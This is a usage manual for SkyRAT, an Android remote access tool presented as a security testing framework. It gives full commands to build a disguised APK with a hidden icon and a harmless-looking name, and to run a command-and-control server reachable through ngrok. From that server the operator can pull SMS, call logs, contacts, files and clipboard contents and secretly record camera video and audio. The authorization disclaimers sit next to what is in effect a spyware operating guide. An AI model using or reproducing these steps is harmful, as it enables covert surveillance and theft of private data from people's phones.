# SkyRAT Usage Manual

Comprehensive guide for using the SkyRAT Android Security Testing Framework.

## 🎯 Overview

SkyRAT provides a complete framework for authorized Android security testing, including:
- **APK Building**: Create custom testing APKs from source code
- **Command & Control**: Remote device access and control
- **Data Extraction**: Comprehensive device data analysis
- **Security Assessment**: Test Android security mechanisms

## ⚠️ Important Legal Notice

**SkyRAT is for authorized security testing only.** Before using:
- Obtain explicit written permission
- Test only on devices you own or have authorization to test
- Comply with all applicable laws and regulations
- Follow responsible disclosure practices

## 🚀 Quick Start

### **1. Build Your First APK**
```bash
# Basic APK build
python3 skyrat.py --build -i 192.168.1.100 -p 8000 -o my-test.apk

# Build with visible icon
python3 skyrat.py --build -i 192.168.1.100 -p 8000 --visible-icon -o visible-test.apk

# Build with custom app name
python3 skyrat.py --build -i 192.168.1.100 -p 8000 --app-name "Security Scanner" -o scanner.apk
```

### **2. Start C&C Server**
```bash
# Start server and wait for connections
python3 skyrat.py --shell -i 192.168.1.100 -p 8000
```

### **3. Install and Test**
```bash
# Install APK on test device
adb install build/my-test.apk

# Grant permissions when prompted
# App will connect automatically to your server
```

## 🔧 Building APKs

### **Build Command Syntax**
```bash
python3 skyrat.py --build [OPTIONS]
```

### **Required Parameters**
- `-i, --ip IP_ADDRESS`: Server IP address
- `-p, --port PORT`: Server port (default: 8000)

### **Optional Parameters**
- `-o, --output FILENAME`: Output APK name (default: skyrat.apk)
- `--visible-icon`: Make app icon visible in launcher
- `--app-name NAME`: Custom app display name
- `--clean`: Clean build directory before building
- `--debug`: Enable verbose build output

### **Build Examples**

#### **Local Network Testing**
```bash
# Basic local build
python3 skyrat.py --build -i 192.168.1.100 -p 8000

# Custom configuration
python3 skyrat.py --build -i 10.0.0.5 -p 9000 -o lab-test.apk --app-name "System Tools"
```

#### **External Access with Ngrok**
```bash
# Build with automatic ngrok tunnel
python3 skyrat.py --build --ngrok -p 8000 -o remote.apk

# Server starts automatically after successful build
# APK connects to external ngrok URL
```

#### **Development Builds**
```bash
# Clean build with debugging
python3 skyrat.py --build --clean --debug -i 127.0.0.1 -p 8000

# Visible app for testing
python3 skyrat.py --build -i 192.168.1.100 -p 8000 --visible-icon --app-name "Test App"
```

### **Build Configuration**

The build process automatically modifies your Android source code:

#### **Config.kt Modifications**
```kotlin
// Before build
object Config {
    const val IP = "192.168.100.84"
    const val PORT = "8000" 
    const val ICON = true
}

// After build (example)
object Config {
    const val IP = "10.0.0.5"
    const val PORT = "9000"
    const val ICON = false  // if --visible-icon used
}
```

#### **App Name Changes**
The build system updates `strings.xml`:
```xml
<!-- Updated automatically -->
<string name="app_name">Your Custom Name</string>
```

## 🖥️ Command & Control Server

### **Server Command Syntax**
```bash
python3 skyrat.py --shell [OPTIONS]
```

### **Server Parameters**
- `-i, --ip IP_ADDRESS`: Server listening IP
- `-p, --port PORT`: Server listening port
- `--debug`: Enable debug output

### **Starting the Server**

#### **Local Server**
```bash
# Listen on specific interface
python3 skyrat.py --shell -i 192.168.1.100 -p 8000

# Listen on all interfaces
python3 skyrat.py --shell -i 0.0.0.0 -p 8000

# Debug mode with verbose output
python3 skyrat.py --shell -i 192.168.1.100 -p 8000 --debug
```

#### **Ngrok Server**
```bash
# Start with ngrok tunnel (after build)
python3 skyrat.py --build --ngrok -p 8000 -o tunnel.apk
# Server starts automatically after build

# Manual ngrok server (if ngrok already configured)
python3 skyrat.py --shell -i 0.0.0.0 -p 8000
```

### **Server Interface**

When a device connects, you'll see:
```
 ____  _          ____      _  _____ 
/ ___|| | ___   _|  _ \    / \|_   _|
\___ \| |/ / | | | |_) |  / _ \ | |  
 ___) |   <| |_| |  _ <  / ___ \| |  
|____/|_|\_\\__, |_| \_\/_/   \_\_|  
            |___/                    

Got connection from ('192.168.1.50', 45678)

Hello there, welcome to complete shell of SM-G998B (Android 13)

SkyRAT:/> 
```

## 📱 Device Commands

### **Device Information**

#### **Basic Information**
```bash
SkyRAT:/> deviceInfo
# Complete device details: model, Android version, hardware info

SkyRAT:/> getIP  
# Device IP address and network information

SkyRAT:/> getMACAddress
# Network interface MAC addresses

SkyRAT:/> getSimDetails
# SIM card information and cellular details

SkyRAT:/> sysinfo
# System information: memory, storage, CPU, uptime
```

#### **Example Output**
```bash
SkyRAT:/> deviceInfo
=== DEVICE INFORMATION ===

Hardware:
  Model: SM-G998B
  Manufacturer: samsung
  Brand: samsung
  Device: o1s
  Product: o1sxxx

System:
  Android: 13
  API Level: 33
  Fingerprint: samsung/o1sxxx/o1s:13/TP1A.220624.014/G998BXXU5EWCB:user/release-keys
```

### **File System Operations**

#### **Navigation**
```bash
SkyRAT:/> pwd
# Show current directory

SkyRAT:/> cd /sdcard/Download
# Change to Downloads folder

SkyRAT:/> ls
# List current directory contents

SkyRAT:/> ls /system/app
# List specific directory
```

#### **File Management**
```bash
SkyRAT:/> download /sdcard/DCIM/Camera/IMG_20240101_120000.jpg
# Download photo from device

SkyRAT:/> upload localfile.txt
# Upload file from server to device

SkyRAT:/> delete /sdcard/unwanted.txt
# Delete file from device

SkyRAT:/> mkdir /sdcard/test-folder
# Create directory
```

#### **File Operations Examples**
```bash
# Download system information
SkyRAT:/> download /proc/version

# Upload configuration file
SkyRAT:/> upload config.json

# Clean up test files
SkyRAT:/> delete /sdcard/test-folder
```

### **Data Extraction**

#### **Communication Data**
```bash
SkyRAT:/> getSMS inbox
# Extract inbox SMS messages

SkyRAT:/> getSMS sent  
# Extract sent SMS messages

SkyRAT:/> getCallLogs
# Extract call history

SkyRAT:/> getContacts
# Extract contact list
```

#### **Application Data**
```bash
SkyRAT:/> getApps
# List all installed applications

SkyRAT:/> getPhotos
# Get photos metadata and information

SkyRAT:/> getAudio
# Get audio files information

SkyRAT:/> getVideos
# Get video files information
```

#### **Data Export Examples**
All extracted data is automatically saved to timestamped files:
```bash
dumps/
├── inbox_SMS_20240315-143022.txt
├── Call_Logs_20240315-143045.txt
├── Contacts_20240315-143123.txt
└── Applications_20240315-143156.txt
```

### **Audio & Video Recording**

#### **Camera Operations**
```bash
SkyRAT:/> camList
# List available cameras (front/back)

SkyRAT:/> startVideo 0
# Start video recording with back camera (camera 0)

SkyRAT:/> startVideo 1  
# Start video recording with front camera (camera 1)

SkyRAT:/> stopVideo
# Stop video recording and download
```

#### **Audio Recording**
```bash
SkyRAT:/> startAudio
# Start audio recording

SkyRAT:/> stopAudio
# Stop audio recording and download
```

#### **Recording Examples**
```bash
# Record 30-second video
SkyRAT:/> startVideo 0
# Wait 30 seconds
SkyRAT:/> stopVideo

# Record audio sample
SkyRAT:/> startAudio  
# Wait for desired duration
SkyRAT:/> stopAudio
```

**Important Notes:**
- Video/audio commands take time to process
- Wait for confirmation before issuing next command
- Large files may take several minutes to download

### **System Operations**

#### **Process Management**
```bash
SkyRAT:/> ps
# List running processes

SkyRAT:/> kill com.example.app
# Kill specific application

SkyRAT:/> shell ps aux
# Execute shell command for detailed process list
```

#### **Network Operations**
```bash
SkyRAT:/> netstat
# Show network connections

SkyRAT:/> ping google.com
# Test internet connectivity

SkyRAT:/> shell ifconfig
# Network interface configuration
```

#### **System Control**
```bash
SkyRAT:/> vibrate 3
# Vibrate device 3 times

SkyRAT:/> getClipData
# Get clipboard contents

SkyRAT:/> setClip "Hello World"
# Set clipboard contents
```

### **Interactive Shell**
```bash
SkyRAT:/> shell
# Enter interactive shell mode

android@shell:~$ ls -la /system
android@shell:~$ cat /proc/cpuinfo  
android@shell:~$ exit
# Return to SkyRAT interface
```

### **Utility Commands**
```bash
SkyRAT:/> help
# Show complete command reference

SkyRAT:/> clear
# Clear screen

SkyRAT:/> exit
# Close connection and exit
```

## 🌐 Network Configuration

### **Local Network Setup**

#### **Find Your IP Address**
```bash
# Linux/macOS
ip addr show  # or ifconfig

# Windows
ipconfig

# Use the IP address of your network interface
python3 skyrat.py --build -i 192.168.1.100 -p 8000
```

#### **Firewall Configuration**
Ensure your firewall allows incoming connections:
```bash
# Linux (ufw)
sudo ufw allow 8000

# macOS
# System Preferences > Security & Privacy > Firewall > Options

# Windows
# Windows Defender Firewall > Allow an app through firewall
```

### **External Access with Ngrok**

#### **Setup Ngrok**
```bash
# Install ngrok
# Download from https://ngrok.com/download

# Get auth token from ngrok.com account
ngrok authtoken YOUR_AUTH_TOKEN

# Build with ngrok tunnel
python3 skyrat.py --build --ngrok -p 8000 -o remote.apk
```

#### **Ngrok Benefits**
- External access without port forwarding
- HTTPS tunnel encryption  
- Dynamic URLs for testing
- Works behind NAT/firewalls

### **Advanced Network Options**

#### **Custom Port Selection**
```bash
# Use different port if 8000 is busy
python3 skyrat.py --build -i 192.168.1.100 -p 9999

# Check port availability
netstat -ln | grep 8000
```

#### **Multiple Connections**
```bash
# Server supports multiple concurrent connections
# Each device appears as separate session
```

## 📊 Data Management

### **Output Organization**
SkyRAT automatically organizes extracted data:

```
dumps/
├── inbox_SMS_20240315-143022.txt
├── sent_SMS_20240315-143045.txt  
├── Call_Logs_20240315-143123.txt
├── Contacts_20240315-143156.txt
├── Applications_20240315-143201.txt
├── Downloaded_20240315-143301_photo.jpg
├── Audio_20240315-143456.m4a
└── Video_20240315-143612.mp4
```

### **File Formats**
- **Text data**: UTF-8 encoded .txt files
- **Images**: Original format (JPG, PNG, etc.)
- **Audio**: M4A, 3GP, or MP4 format
- **Video**: MP4 or 3GP format
- **Files**: Original format preserved

### **Data Analysis**
```bash
# Analyze extracted data
grep "keyword" dumps/inbox_SMS_*.txt
wc -l dumps/Call_Logs_*.txt
file dumps/Downloaded_*
```

## 🔧 Troubleshooting

### **Common Issues**

#### **Build Failures**
```bash
# Clean build if issues occur
python3 skyrat.py --build --clean -i IP -p PORT

# Check Java installation
java -version

# Verify Android SDK
echo $ANDROID_HOME
```

#### **Connection Issues**
```bash
# Check server is running
netstat -ln | grep 8000

# Verify IP address is correct
ping YOUR_SERVER_IP

# Check firewall settings
```

#### **Permission Denied**
- Ensure all app permissions are granted
- Check Android security settings
- Verify device allows installation from unknown sources

#### **Timeout Issues**
- Large file operations take time
- Wait for command completion before issuing new commands
- Use debug mode for verbose output

### **Debug Mode**
```bash
# Enable debug output for troubleshooting
python3 skyrat.py --shell -i IP -p PORT --debug
python3 skyrat.py --build --debug -i IP -p PORT
```

## 📚 Best Practices

### **Security Testing**
1. **Authorized Testing Only**: Always obtain explicit permission
2. **Isolated Environment**: Use dedicated test networks
3. **Documentation**: Record all testing activities
4. **Data Protection**: Secure extracted data appropriately

### **Technical Best Practices**
1. **Clean Builds**: Use `--clean` for fresh APK builds
2. **Unique Names**: Use descriptive APK output names
3. **Network Security**: Use VPN or secure networks
4. **Regular Updates**: Keep SkyRAT updated

### **Operational Security**
1. **Test Environment**: Use isolated test devices
2. **Data Handling**: Follow data protection protocols
3. **Access Control**: Restrict server access appropriately
4. **Audit Trail**: Maintain testing documentation

## 🆘 Getting Help

### **Command Help**
```bash
# Framework help
python3 skyrat.py --help

# In-session help
SkyRAT:/> help
```

### **Community Support**
- **GitHub Issues**: https://github.com/techsky-eh/skyrat/issues
- **Discussions**: https://github.com/techsky-eh/skyrat/discussions
- **Documentation**: Check docs/ folder for detailed guides

### **Reporting Issues**
When reporting issues, include:
- Operating system and version
- Python and Java versions
- Complete error messages
- Steps to reproduce
- Device information (for connection issues)

---

**You're now ready to use SkyRAT for authorized Android security testing!**

For advanced features and automation, see the [Command Reference](commands.md) and [Examples](../examples/).